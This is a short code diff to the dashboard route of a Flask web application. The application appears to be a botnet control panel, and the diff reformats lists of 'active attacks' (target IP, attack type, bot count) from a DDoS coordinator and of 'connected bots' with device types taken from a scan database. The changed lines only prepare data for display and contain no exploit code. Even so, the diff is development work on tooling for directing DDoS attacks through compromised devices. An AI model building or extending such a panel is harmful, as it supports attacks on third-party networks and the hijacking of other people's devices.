@@ -39,8 +39,31 @@ def dashboard():
     try:
         stats = db.get_statistics()
         recent_scans = db.get_scan_results(limit=10)
-        active_attacks = ddos_coordinator.get_all_active_attacks()
-        connected_bots = comm_handler.get_connected_bots()
+        
+        # Format active attacks for the template
+        raw_attacks = ddos_coordinator.get_all_active_attacks()
+        active_attacks = []
+        for attack in raw_attacks:
+            active_attacks.append({
+                'target': attack.get('target_ip', ''),
+                'attack_type': attack.get('attack_type', ''),
+                'start_time': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(attack.get('start_time', 0))),
+                'bot_count': attack.get('bot_count', 0),
+                'status': attack.get('status', 'unknown')
+            })
+        
+        # Format connected bots for the template
+        connected_ips = comm_handler.get_connected_bots()
+        connected_bots = []
+        for ip in connected_ips:
+            # Get device info from database if available
+            device_info = db.get_device_by_ip(ip)
+            connected_bots.append({
+                'ip': ip,
+                'device_type': device_info.get('device_type', 'Unknown') if device_info else 'Unknown',
+                'last_seen': 'Now',
+                'status': 'Active'
+            })
         
         return render_template('dashboard.html', 
                              stats=stats,
